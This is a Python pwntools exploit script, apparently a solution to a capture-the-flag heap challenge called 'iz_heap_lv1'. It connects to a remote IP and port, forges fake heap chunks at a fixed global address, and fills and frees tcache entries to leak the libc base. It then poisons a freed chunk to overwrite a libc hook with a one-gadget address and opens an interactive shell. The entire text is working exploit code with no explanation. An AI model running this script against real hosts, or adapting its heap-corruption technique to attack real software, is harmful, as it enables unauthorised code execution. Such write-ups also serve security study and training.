from pwn import *

#p = process("./iz_heap_lv1")
p = remote("165.22.110.249",3333)

def add(size , data):
	p.sendlineafter(":","1")
	p.sendlineafter(":",str(size))
	p.sendafter(":",data)

def edit(idx , size , data):
	p.sendlineafter(":","2")
	p.sendlineafter(":",str(idx))
	p.sendlineafter(":",str(size))
	p.sendafter(":",data)

def delete(idx):
	p.sendlineafter(":","3")
	p.sendlineafter(":",str(idx))

def editname(name):
	p.sendlineafter(":","4")
	p.sendlineafter(":","Y")
	p.sendafter(":",name)

p.sendafter(":",p64(0x0000000000602120)+p64(0)+p64(0)+p64(0x91)+"A"*0x80+p64(0)+p64(0x21)+"A"*0x10+p64(0)+p64(0x21))

for i in range(7):
	print i
	add(0x7f,"A")

for i in range(7):
	print i
	delete(i)

delete(20)

editname("A"*0x20)

libcbase = u64(p.recvuntil("\x7f")[-6:]+"\x00\x00") - 0x3ebca0

print hex(libcbase)

editname(p64(0x0000000000602120)+p64(0)+p64(0)+p64(0x71)+"A"*0x60+p64(0)+p64(0x21)+"A"*0x10+p64(0)+p64(0x21))

delete(20)

editname(p64(0x0000000000602120)+p64(0)+p64(0)+p64(0x71)+p64(libcbase+0x3ed8e8)+"A"*(0x60-8)+p64(0)+p64(0x21)+"A"*0x10+p64(0)+p64(0x21))

add(0x68,"A")
add(0x68,p64(libcbase+0x4f322))

p.interactive()
